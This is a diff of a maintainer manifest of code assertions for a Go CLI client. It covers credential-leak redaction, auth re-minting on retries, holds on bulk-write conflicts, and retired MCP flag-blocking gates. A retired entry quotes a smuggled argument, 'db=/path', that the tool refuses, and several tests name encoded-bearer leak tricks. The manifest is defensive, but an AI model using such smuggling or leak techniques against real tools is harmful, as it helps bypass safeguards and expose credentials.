+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "func (c *Client) largeBodyRevealsCredential(body []byte, isJSON bool, extra []string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "masks, _, held := c.credentialMaskSet(true, extra)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "for _, n := range alignedBase64(form) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "v := strings.ToLower(stripRemovable(view(text)))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "masks, secrets, held := c.credentialMaskSet(takeLock, extraCredentials)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func (c *Client) credentialMaskSet(takeLock bool, extraCredentials []string) (masks []credentialMask, secrets, held []string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/largebody_test.go",
+     "contains": "func TestLargeBodyCleanPassesUnchanged(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/largebody_test.go",
+     "contains": "func TestLargeBodyEveryEncodingWithheld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/largebody_test.go",
+     "contains": "func TestLargeBodyZeroWidthSplitWithheld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/largebody_cli_test.go",
+     "contains": "func TestLargeBodyCLICleanPassesUnchanged(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "if maskCredentialTextWith(s, masks, secrets, held) != s {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func maskCredentialTextWith(text string, masks []credentialMask, secrets, held []string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/fresh_1b_test.go",
+     "contains": "func TestReadLargeBodyDoubleBase64Bearer(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/fresh_1b_test.go",
+     "contains": "func TestLargeBodyDoubleBase64BearerIsWithheld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/fresh_1b_r2_test.go",
+     "contains": "func TestReadLargeTextDoubleBase64Bearer(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/fresh_1b_r2_test.go",
+     "contains": "func TestLargeTextDoubleBase64BearerIsWithheld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "\tout, err := c.redactSuccessBodyWhole(body, extraCredentials...)\n\tif err != nil || len(out) == 0 {\n\t\treturn out, err\n\t}\n\tif err := c.valuesReveal(out, extraCredentials); err != nil {\n\t\treturn nil, err\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "func (c *Client) valueCheck(extra []string) func(string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "s := stripSpaceAndRemovable(v)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "if unicode.IsSpace(r) || unicode.IsControl(r) || unicode.Is(unicode.Cf, r) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "const recursiveDecodeCap = 65536",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/final_r1_test.go",
+     "contains": "func TestSplitEncodedBearerIsWithheld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/final_r1_test.go",
+     "contains": "func TestReadSpacedDoubleBase64Bearer(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "\t\ts := stripSpaceAndRemovable(v)\n\t\tif len(s) > recursiveDecodeCap {\n\t\t\treturn ErrSuccessBodyValueTooLarge\n\t\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/final_r2_test.go",
+     "contains": "func TestEntityEncodedBearerPastCapIsWithheld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/final_r2_test.go",
+     "contains": "func TestSpacedBearerValueIsWithheld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/final_r2_test.go",
+     "contains": "func TestProseValueOverCapIsWithheld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/final_r2_test.go",
+     "contains": "func TestReadEntityEncodedBearerPastCap(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-resolved-per-attempt",
+   "status": "active",
+   "summary": "The client resolves auth for every attempt, after rate-limit waits and every Retry-After or backoff sleep, so a token that expired (or will within the refresh skew) is re-minted instead of resent.",
+   "why": "Fresh Codex round 1: auth was resolved once before the retry loop; a token with expires_in 2 and a 429 with Retry-After 3 sent the expired bearer on the retry.",
+   "spec_encode_followup": "Press-side: resolve the auth header inside the retry loop of the generated client.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "freshAuth, authErr := c.authHeader(ctx)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "\t\tauthHeader = freshAuth\n",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/fresh_r1_test.go",
+     "contains": "func TestRetryAfterWaitReMintsExpiredToken(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "bulk-conflict-needs-review",
+   "status": "active",
+   "summary": "A bulk row whose write comes back conflicting (CIPP success state beside failure text) exits non-zero, is never checkpointed as done, and is recorded needs-review with the raw result; no later run (with or without --resume) resends it until the CSV changes. The hold stores only the CSV's sha256, its resolved path's sha256 and row indices (no CIPP response, no row content) in every mode, is saved as soon as the conflict is seen, and bulk --execute refuses to start when this CSV's checkpoint file cannot be opened for writing (or, when it does not exist yet, when the checkpoint folder cannot take a new file).",
+   "why": "Fresh Codex round 1: a conflicting result was either a false success (checkpointed) or, once treated as failure, would be resent by --resume though it may already have taken effect. Fresh Codex round 2: the hold saved CIPP's raw response even under CIPP_NO_LOCAL_DATA=1, and a failed checkpoint write lost the hold. Fresh Codex round 3: an existing read-only checkpoint passed the folder probe, so the hold could not be saved and a re-run resent the write.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "NeedsReview []int  `json:\"needs_review,omitempty\"`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "if verdict == cippConflicting {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "if review[idx] {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r1_review_test.go",
+     "contains": "func TestBulkConflictingWriteIsNeverResent(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "func bulkCheckpointWritable(cpPath string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "if err := bulkCheckpointWritable(cpPath); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r2_review_test.go",
+     "contains": "func TestBulkNeedsReviewHoldStoresNoCIPPData(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r2_review_test.go",
+     "contains": "func TestBulkRefusesUnwritableCheckpointDir(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "if f, err := os.OpenFile(cpPath, os.O_WRONLY, 0); err == nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r3_review_test.go",
+     "contains": "func TestBulkRefusesReadOnlyCheckpoint(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
